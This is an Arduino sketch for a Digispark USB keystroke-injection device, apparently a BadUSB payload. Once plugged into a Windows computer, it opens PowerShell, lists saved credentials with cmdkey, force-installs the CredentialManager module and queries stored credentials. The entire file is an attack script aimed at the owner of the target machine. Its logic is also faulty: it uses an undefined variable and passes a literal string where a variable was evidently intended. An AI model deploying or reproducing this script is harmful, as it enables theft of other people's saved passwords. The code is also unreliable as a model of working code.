#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(250);
  DigiKeyboard.println("powershell");
  delay(2500);
  DigiKeyboard.println(F("cmdkey /list"));
  delay(250);
  DigiKeyboard.println(F("Install-Module -Name CredentialManager -Scope CurrentUser -Force"));
  delay(250);
  DigiKeyboard.println(F("Import-Module CredentialManager"));
  delay(250);
  DigiKeyboard.println(F("cmdkey /list"));
  delay(250);
  if(Usuario != ""){
    String credencial = Usuario;
  }
  DigiKeyboard.println(F("Get-StoredCredential -Target credencial"));
while(1);


}
